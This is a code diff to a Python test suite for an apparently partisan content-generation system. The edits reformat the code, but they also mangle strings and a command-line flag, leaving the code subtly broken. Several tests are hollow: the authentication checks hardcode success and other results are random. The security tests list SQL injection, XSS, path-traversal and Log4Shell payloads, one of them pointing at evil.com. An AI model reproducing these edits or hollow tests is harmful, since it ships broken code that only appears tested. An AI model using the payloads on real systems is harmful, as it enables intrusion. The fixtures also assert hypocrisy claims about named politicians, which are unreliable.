         """Test system under concurrent load"""
 
         # Simulate concurrent load test
+
+
         async def concurrent_operation():
             await asyncio.sleep(random.uniform(0.1, 0.5))
             return random.choice([True, False])
@@ -1142,24 +1202,25 @@ class ComprehensiveTestSuite:
 
         return {
             "success": success,
-            "message": f"Concurrent load test: {success_rate:.2f} success rate in {execution_time:.2f}s",
-            "details": {
+                "message": f"Concurrent load test: {success_rate:.2f} success rate in {execution_time:.2f}s",
+                "details": {
                 "concurrent_operations": len(tasks),
-                "success_rate": success_rate,
-                "total_time": execution_time,
-            },
-            "performance_metrics": {
+                    "success_rate": success_rate,
+                    "total_time": execution_time,
+                    },
+                "performance_metrics": {
                 "throughput": len(tasks) / execution_time,
-                "success_rate": success_rate,
-            },
-        }
+                    "success_rate": success_rate,
+                    },
+                }
+
 
     async def _test_memory_usage(self) -> Dict[str, Any]:
         """Test memory usage patterns"""
         # Monitor memory usage during operations
         initial_memory = psutil.Process().memory_info().rss
 
-        # Simulate memory-intensive operations
+        # Simulate memory - intensive operations
         data = []
         for _ in range(1000):
             data.append("x" * 1000)  # 1KB per item
@@ -1175,26 +1236,27 @@ class ComprehensiveTestSuite:
 
         return {
             "success": success,
-            "message": f"Memory usage test: {memory_delta / 1024 / 1024:.2f}MB delta",
-            "details": {
+                "message": f"Memory usage test: {memory_delta / 1024 / 1024:.2f}MB delta",
+                "details": {
                 "initial_memory_mb": initial_memory / 1024 / 1024,
-                "peak_memory_mb": peak_memory / 1024 / 1024,
-                "memory_delta_mb": memory_delta / 1024 / 1024,
-            },
-            "performance_metrics": {
+                    "peak_memory_mb": peak_memory / 1024 / 1024,
+                    "memory_delta_mb": memory_delta / 1024 / 1024,
+                    },
+                "performance_metrics": {
                 "memory_efficiency": 1.0 - (memory_delta / (100 * 1024 * 1024))
             },
-        }
+                }
+
 
     async def _test_sql_injection_protection(self) -> Dict[str, Any]:
         """Test SQL injection protection"""
         # Test SQL injection attempts
         malicious_inputs = [
             "'; DROP TABLE test_articles; --",
-            "1' OR '1'='1",
-            "admin'--",
-            "1' UNION SELECT * FROM test_politicians--",
-        ]
+                "1' OR '1'='1",
+                "admin'--",
+                "1' UNION SELECT * FROM test_politicians--",
+                ]
 
         vulnerabilities_found = 0
 
@@ -1218,22 +1280,23 @@ class ComprehensiveTestSuite:
 
         return {
             "success": success,
-            "message": f"SQL injection test: {vulnerabilities_found} vulnerabilities found",
-            "details": {
+                "message": f"SQL injection test: {vulnerabilities_found} vulnerabilities found",
+                "details": {
                 "tests_run": len(malicious_inputs),
-                "vulnerabilities_found": vulnerabilities_found,
-            },
-        }
+                    "vulnerabilities_found": vulnerabilities_found,
+                    },
+                }
+
 
     async def _test_input_sanitization(self) -> Dict[str, Any]:
         """Test input sanitization"""
         # Test various malicious inputs
         malicious_inputs = [
-            "<script>alert('xss')</script>",
-            "javascript:alert('xss')",
-            "../../../etc/passwd",
-            "${jndi:ldap://evil.com/a}",
-        ]
+            "<script > alert('xss')</script>",
+                "javascript:alert('xss')",
+                "../../../etc / passwd",
+                "${jndi:ldap://evil.com / a}",
+                ]
 
         sanitization_failures = 0
 
@@ -1250,31 +1313,33 @@ class ComprehensiveTestSuite:
 
         return {
             "success": success,
-            "message": f"Input sanitization test: {sanitization_failures} failures",
-            "details": {
+                "message": f"Input sanitization test: {sanitization_failures} failures",
+                "details": {
                 "tests_run": len(malicious_inputs),
-                "sanitization_failures": sanitization_failures,
-            },
-        }
+                    "sanitization_failures": sanitization_failures,
+                    },
+                }
+
 
     async def _test_authentication_security(self) -> Dict[str, Any]:
         """Test authentication security"""
         # Simulate authentication tests
         auth_tests = [
             {"test": "weak_password", "success": True},
-            {"test": "brute_force_protection", "success": True},
-            {"test": "session_management", "success": True},
-            {"test": "token_validation", "success": True},
-        ]
+                {"test": "brute_force_protection", "success": True},
+                {"test": "session_management", "success": True},
+                {"test": "token_validation", "success": True},
+                ]
 
         failed_tests = [test for test in auth_tests if not test["success"]]
         success = len(failed_tests) == 0
 
         return {
             "success": success,
-            "message": f"Authentication security: {len(failed_tests)} failures",
-            "details": {"total_tests": len(auth_tests), "failed_tests": failed_tests},
-        }
+                "message": f"Authentication security: {len(failed_tests)} failures",
+                "details": {"total_tests": len(auth_tests), "failed_tests": failed_tests},
+                }
+
 
     async def _test_data_encryption(self) -> Dict[str, Any]:
         """Test data encryption"""
@@ -1294,20 +1359,21 @@ class ComprehensiveTestSuite:
 
         return {
             "success": success,
-            "message": f'Data encryption test: {"PASS" if success else "FAIL"}',
-            "details": {
+                "message": f'Data encryption test: {"PASS" if success else "FAIL"}',
+                "details": {
                 "encryption_works": encryption_works,
-                "data_is_encrypted": data_is_encrypted,
-            },
-        }
+                    "data_is_encrypted": data_is_encrypted,
+                    },
+                }
+
 
     async def _test_conservative_alignment(self) -> Dict[str, Any]:
         """Test conservative messaging alignment"""
         test_contents = [
             "America First policies promote freedom and individual liberty for all patriots.",
-            "Traditional family values and constitutional principles guide our great nation.",
-            "Limited government and free market capitalism create prosperity for everyone.",
-        ]
+                "Traditional family values and constitutional principles guide our great nation.",
+                "Limited government and free market capitalism create prosperity for everyone.",
+                ]
 
         alignment_scores = []
         for content in test_contents:
@@ -1319,12 +1385,13 @@ class ComprehensiveTestSuite:
 
         return {
             "success": success,
-            "message": f"Conservative alignment: {avg_alignment:.2f} average score",
-            "details": {
+                "message": f"Conservative alignment: {avg_alignment:.2f} average score",
+                "details": {
                 "individual_scores": alignment_scores,
-                "average_score": avg_alignment,
-            },
-        }
+                    "average_score": avg_alignment,
+                    },
+                }
+
 
     async def _test_bias_detection(self) -> Dict[str, Any]:
         """Test liberal bias detection"""
@@ -1345,17 +1412,18 @@ class ComprehensiveTestSuite:
 
         return {
             "success": success,
-            "message": f'Bias detection accuracy: {"PASS" if success else "FAIL"}',
-            "details": {
+                "message": f'Bias detection accuracy: {"PASS" if success else "FAIL"}',
+                "details": {
                 "biased_content_detected": bias_detected_correctly,
-                "unbiased_content_classified": unbiased_classified_correctly,
-                "biased_score": biased_result["bias_detection"]["bias_score"],
-                "unbiased_score": unbiased_result["bias_detection"]["bias_score"],
-            },
-        }
+                    "unbiased_content_classified": unbiased_classified_correctly,
+                    "biased_score": biased_result["bias_detection"]["bias_score"],
+                    "unbiased_score": unbiased_result["bias_detection"]["bias_score"],
+                    },
+                }
+
 
     async def _test_fact_checking(self) -> Dict[str, Any]:
-        """Test fact-checking functionality"""
+        """Test fact - checking functionality"""
         factual_content = "According to the Bureau of Labor Statistics, unemployment rates have fluctuated."
         unfactual_content = "Random claims without any sources or verification."
 
@@ -1373,12 +1441,13 @@ class ComprehensiveTestSuite:
 
         return {
             "success": success,
-            "message": f"Fact-checking: factual={factual_score:.2f}, unfactual={unfactual_score:.2f}",
-            "details": {
+                "message": f"Fact - checking: factual={factual_score:.2f}, unfactual={unfactual_score:.2f}",
+                "details": {
                 "factual_score": factual_score,
-                "unfactual_score": unfactual_score,
-            },
-        }
+                    "unfactual_score": unfactual_score,
+                    },
+                }
+
 
     async def _test_humor_quality(self) -> Dict[str, Any]:
         """Test humor quality analysis"""
@@ -1399,9 +1468,10 @@ class ComprehensiveTestSuite:
 
         return {
             "success": success,
-            "message": f"Humor analysis: humorous={humor_score:.2f}, serious={serious_score:.2f}",
-            "details": {"humorous_score": humor_score, "serious_score": serious_score},
-        }
+                "message": f"Humor analysis: humorous={humor_score:.2f}, serious={serious_score:.2f}",
+                "details": {"humorous_score": humor_score, "serious_score": serious_score},
+                }
+
 
     async def _test_source_verification(self) -> Dict[str, Any]:
         """Test source credibility verification"""
@@ -1422,23 +1492,24 @@ class ComprehensiveTestSuite:
 
         return {
             "success": success,
-            "message": f"Source verification: credible={credible_score:.2f}, uncredible={uncredible_score:.2f}",
-            "details": {
+                "message": f"Source verification: credible={credible_score:.2f}, uncredible={uncredible_score:.2f}",
+                "details": {
                 "credible_score": credible_score,
-                "uncredible_score": uncredible_score,
-            },
-        }
+                    "uncredible_score": uncredible_score,
+                    },
+                }
+
 
     async def _test_daily_news_workflow(self) -> Dict[str, Any]:
         """Test complete daily news processing workflow"""
         workflow_steps = [
             "morning_scraping",
-            "content_analysis",
-            "hypocrisy_detection",
-            "content_generation",
-            "quality_validation",
-            "publication_preparation",
-        ]
+                "content_analysis",
+                "hypocrisy_detection",
+                "content_generation",
+                "quality_validation",
+                "publication_preparation",
+                ]
 
         workflow_results = {}
         total_time = 0
@@ -1452,8 +1523,8 @@ class ComprehensiveTestSuite:
 
             workflow_results[step] = {
                 "success": step_success,
-                "execution_time": step_time,
-            }
+                    "execution_time": step_time,
+                    }
             total_time += step_time
 
         successful_steps = sum(
@@ -1463,23 +1534,24 @@ class ComprehensiveTestSuite:
 
         return {
             "success": success,
-            "message": f"Daily workflow: {successful_steps}/{len(workflow_steps)} steps successful in {total_time:.2f}s",
-            "details": workflow_results,
-            "performance_metrics": {
+                "message": f"Daily workflow: {successful_steps}/{len(workflow_steps)} steps successful in {total_time:.2f}s",
+                "details": workflow_results,
+                "performance_metrics": {
                 "total_execution_time": total_time,
-                "success_rate": successful_steps / len(workflow_steps),
-            },
-        }
+                    "success_rate": successful_steps / len(workflow_steps),
+                    },
+                }
+
 
     async def _test_weekly_content_generation(self) -> Dict[str, Any]:
         """Test weekly content generation workflow"""
         content_types = [
             "hypocrisy_alerts",
-            "media_lies_compilation",
-            "policy_flip_flop_analysis",
-            "cross_promotion_content",
-            "humor_segments",
-        ]
+                "media_lies_compilation",
+                "policy_flip_flop_analysis",
+                "cross_promotion_content",
+                "humor_segments",
+                ]
 
         generation_results = {}
         total_content_quality = 0
@@ -1491,9 +1563,9 @@ class ComprehensiveTestSuite:
 
             generation_results[content_type] = {
                 "generation_time": generation_time,
-                "quality_score": content_quality,
-                "success": content_quality > 0.7,
-            }
+                    "quality_score": content_quality,
+                    "success": content_quality > 0.7,
+                    }
             total_content_quality += content_quality
 
         avg_quality = total_content_quality / len(content_types)
@@ -1504,13 +1576,14 @@ class ComprehensiveTestSuite:
 
         return {
             "success": success,
-            "message": f"Weekly content: {successful_content}/{len(content_types)} types successful, avg quality {avg_quality:.2f}",
-            "details": generation_results,
-            "performance_metrics": {
+                "message": f"Weekly content: {successful_content}/{len(content_types)} types successful, avg quality {avg_quality:.2f}",
+                "details": generation_results,
+                "performance_metrics": {
                 "average_quality": avg_quality,
-                "success_rate": successful_content / len(content_types),
-            },
-        }
+                    "success_rate": successful_content / len(content_types),
+                    },
+                }
+
 
     async def _test_hypocrisy_detection_workflow(self) -> Dict[str, Any]:
         """Test hypocrisy detection workflow"""
@@ -1518,17 +1591,17 @@ class ComprehensiveTestSuite:
         test_statements = [
             {
                 "politician": "Joe Biden",
-                "statement_1": "We need to secure our borders",
-                "statement_2": "Border walls are immoral",
-                "expected_hypocrisy": True,
-            },
-            {
+                    "statement_1": "We need to secure our borders",
+                    "statement_2": "Border walls are immoral",
+                    "expected_hypocrisy": True,
+                    },
+                {
                 "politician": "Nancy Pelosi",
-                "statement_1": "Follow the science on COVID",
-                "statement_2": "Hair salons are essential for me",
-                "expected_hypocrisy": True,
-            },
-        ]
+                    "statement_1": "Follow the science on COVID",
+                    "statement_2": "Hair salons are essential for me",
+                    "expected_hypocrisy": True,
+                    },
+                ]
 
         detection_results = []
         for test_case in test_statements:
@@ -1541,11 +1614,11 @@ class ComprehensiveTestSuite:
             detection_results.append(
                 {
                     "politician": test_case["politician"],
-                    "detected": detected_hypocrisy,
-                    "expected": test_case["expected_hypocrisy"],
-                    "correct": correct_detection,
-                    "confidence": confidence_score,
-                }
+                        "detected": detected_hypocrisy,
+                        "expected": test_case["expected_hypocrisy"],
+                        "correct": correct_detection,
+                        "confidence": confidence_score,
+                        }
             )
 
         accuracy = sum(1 for result in detection_results if result["correct"]) / len(
@@ -1555,24 +1628,25 @@ class ComprehensiveTestSuite:
 
         return {
             "success": success,
-            "message": f"Hypocrisy detection accuracy: {accuracy:.2f}",
-            "details": {
+                "message": f"Hypocrisy detection accuracy: {accuracy:.2f}",
+                "details": {
                 "test_cases": len(test_statements),
-                "correct_detections": sum(1 for r in detection_results if r["correct"]),
-                "accuracy": accuracy,
-                "results": detection_results,
-            },
-        }
+                    "correct_detections": sum(1 for r in detection_results if r["correct"]),
+                    "accuracy": accuracy,
+                    "results": detection_results,
+                    },
+                }
+
 
     async def _test_cross_promotion_workflow(self) -> Dict[str, Any]:
-        """Test cross-promotion workflow"""
+        """Test cross - promotion workflow"""
         promotion_channels = [
             "youtube_comments",
-            "social_media_posts",
-            "email_newsletter",
-            "website_banners",
-            "podcast_mentions",
-        ]
+                "social_media_posts",
+                "email_newsletter",
+                "website_banners",
+                "podcast_mentions",
+                ]
 
         promotion_results = {}
         total_effectiveness = 0
@@ -1588,10 +1662,10 @@ class ComprehensiveTestSuite:
 
             promotion_results[channel] = {
                 "reach": reach,
-                "engagement_rate": engagement_rate,
-                "conversion_rate": conversion_rate,
-                "effectiveness": effectiveness,
-                "success": effectiveness > 1.0,  # 1% effectiveness threshold
+                    "engagement_rate": engagement_rate,
+                    "conversion_rate": conversion_rate,
+                    "effectiveness": effectiveness,
+                    "success": effectiveness > 1.0,  # 1% effectiveness threshold
             }
 
         avg_effectiveness = total_effectiveness / len(promotion_channels)
@@ -1604,13 +1678,14 @@ class ComprehensiveTestSuite:
 
         return {
             "success": success,
-            "message": f"Cross-promotion: {successful_channels}/{len(promotion_channels)} channels effective, avg {avg_effectiveness:.2f}%",
-            "details": promotion_results,
-            "performance_metrics": {
+                "message": f"Cross - promotion: {successful_channels}/{len(promotion_channels)} channels effective, avg {avg_effectiveness:.2f}%",
+                "details": promotion_results,
+                "performance_metrics": {
                 "average_effectiveness": avg_effectiveness,
-                "success_rate": successful_channels / len(promotion_channels),
-            },
-        }
+                    "success_rate": successful_channels / len(promotion_channels),
+                    },
+                }
+
 
     def _generate_test_report(
         self, start_time: datetime, end_time: datetime
@@ -1633,7 +1708,7 @@ class ComprehensiveTestSuite:
         performance_scores = []
         for result in self.test_results:
             if result.performance_metrics:
-                # Normalize performance metrics to 0-1 scale
+                # Normalize performance metrics to 0 - 1 scale
                 if "execution_time" in result.performance_metrics:
                     # Lower execution time = higher score
                     exec_time = result.performance_metrics["execution_time"]
@@ -1660,18 +1735,19 @@ class ComprehensiveTestSuite:
 
         return TestSuiteReport(
             suite_name="Conservative Research System Comprehensive Test Suite",
-            start_time=start_time,
-            end_time=end_time,
-            total_tests=total_tests,
-            passed_tests=passed_tests,
-            failed_tests=failed_tests,
-            skipped_tests=skipped_tests,
-            error_tests=error_tests,
-            coverage_percentage=coverage_percentage,
-            performance_score=performance_score * 100,
-            quality_score=quality_score * 100,
-            test_results=self.test_results,
-        )
+                start_time = start_time,
+                end_time = end_time,
+                total_tests = total_tests,
+                passed_tests = passed_tests,
+                failed_tests = failed_tests,
+                skipped_tests = skipped_tests,
+                error_tests = error_tests,
+                coverage_percentage = coverage_percentage,
+                performance_score = performance_score * 100,
+                quality_score = quality_score * 100,
+                test_results = self.test_results,
+                )
+
 
     def save_test_report(self, report: TestSuiteReport, filename: str = None) -> str:
         """Save test report to file"""
@@ -1681,48 +1757,49 @@ class ComprehensiveTestSuite:
 
         report_data = {
             "suite_name": report.suite_name,
-            "execution_summary": {
+                "execution_summary": {
                 "start_time": report.start_time.isoformat(),
-                "end_time": report.end_time.isoformat(),
-                "duration_seconds": (
+                    "end_time": report.end_time.isoformat(),
+                    "duration_seconds": (
                     report.end_time - report.start_time
                 ).total_seconds(),
-                "total_tests": report.total_tests,
-                "passed_tests": report.passed_tests,
-                "failed_tests": report.failed_tests,
-                "skipped_tests": report.skipped_tests,
-                "error_tests": report.error_tests,
-                "success_rate": (
+                    "total_tests": report.total_tests,
+                    "passed_tests": report.passed_tests,
+                    "failed_tests": report.failed_tests,
+                    "skipped_tests": report.skipped_tests,
+                    "error_tests": report.error_tests,
+                    "success_rate": (
                     (report.passed_tests / report.total_tests) * 100
                     if report.total_tests > 0
                     else 0
                 ),
-            },
-            "quality_metrics": {
+                    },
+                "quality_metrics": {
                 "coverage_percentage": report.coverage_percentage,
-                "performance_score": report.performance_score,
-                "quality_score": report.quality_score,
-            },
-            "test_results": [
+                    "performance_score": report.performance_score,
+                    "quality_score": report.quality_score,
+                    },
+                "test_results": [
                 {
                     "test_name": result.test_name,
-                    "category": result.test_category,
-                    "status": result.status,
-                    "execution_time": result.execution_time,
-                    "timestamp": result.timestamp.isoformat(),
-                    "message": result.message,
-                    "details": result.details,
-                    "performance_metrics": result.performance_metrics,
-                }
+                        "category": result.test_category,
+                        "status": result.status,
+                        "execution_time": result.execution_time,
+                        "timestamp": result.timestamp.isoformat(),
+                        "message": result.message,
+                        "details": result.details,
+                        "performance_metrics": result.performance_metrics,
+                        }
                 for result in report.test_results
             ],
-            "recommendations": self._generate_recommendations(report),
-        }
+                "recommendations": self._generate_recommendations(report),
+                }
 
         with open(filename, "w") as f:
-            json.dump(report_data, f, indent=2, default=str)
+            json.dump(report_data, f, indent = 2, default = str)
 
         return filename
+
 
     def _generate_recommendations(self, report: TestSuiteReport) -> List[str]:
         """Generate improvement recommendations based on test results"""
@@ -1778,8 +1855,9 @@ class ComprehensiveTestSuite:
 
         return recommendations
 
-
 # CLI Interface and Main Execution
+
+
 def print_test_summary(report: TestSuiteReport):
     """Print formatted test summary"""
     print("\n" + "=" * 80)
@@ -1798,7 +1876,7 @@ def print_test_summary(report: TestSuiteReport):
     print(f"  ❌ Failed: {report.failed_tests}")
     print(f"  ⚠️  Errors: {report.error_tests}")
     print(f"  ⏭️  Skipped: {report.skipped_tests}")
-    print(f"  Success Rate: {(report.passed_tests/report.total_tests)*100:.1f}%")
+    print(f"  Success Rate: {(report.passed_tests / report.total_tests)*100:.1f}%")
 
     print("\nQUALITY METRICS:")
     print(f"  Coverage: {report.coverage_percentage:.1f}%")
@@ -1827,25 +1905,25 @@ async def main():
     )
     parser.add_argument(
         "--category",
-        choices=[
+            choices=[
             "unit",
-            "integration",
-            "performance",
-            "security",
-            "quality",
-            "e2e",
-            "chaos",
-        ],
-        help="Run specific test category only",
-    )
+                "integration",
+                "performance",
+                "security",
+                "quality",
+                "e2e",
+                "chaos",
+                ],
+            help="Run specific test category only",
+            )
     parser.add_argument(
         "--output",
-        default="console",
-        choices=["console", "json", "both"],
-        help="Output format",
-    )
+            default="console",
+            choices=["console", "json", "both"],
+            help="Output format",
+            )
     parser.add_argument(
-        "--save-report", action="store_true", help="Save detailed report to file"
+        "--save - report", action="store_true", help="Save detailed report to file"
     )
 
     args = parser.parse_args()
@@ -1884,7 +1962,6 @@ async def main():
         print(f"\n💥 Test suite execution failed: {str(e)}")
         logger.error(f"Test suite execution failed: {str(e)}")
         exit(2)
-
 
 if __name__ == "__main__":
     asyncio.run(main())
